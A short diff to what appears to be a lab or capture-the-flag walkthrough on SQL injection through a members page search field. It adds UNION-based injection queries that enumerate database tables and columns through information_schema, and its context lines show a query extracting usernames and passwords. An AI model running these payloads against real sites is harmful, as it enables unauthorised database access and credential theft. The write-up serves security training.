@@ -2,6 +2,11 @@
 
 ### Instructions
 
+This query returns all available columns in the db
+`1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns`
+And this query allows to check all tables
+`1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.columns`
+
 We have noticed that members page has sql search input
 Using next query we get users creditianals
 `1 AND 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default`
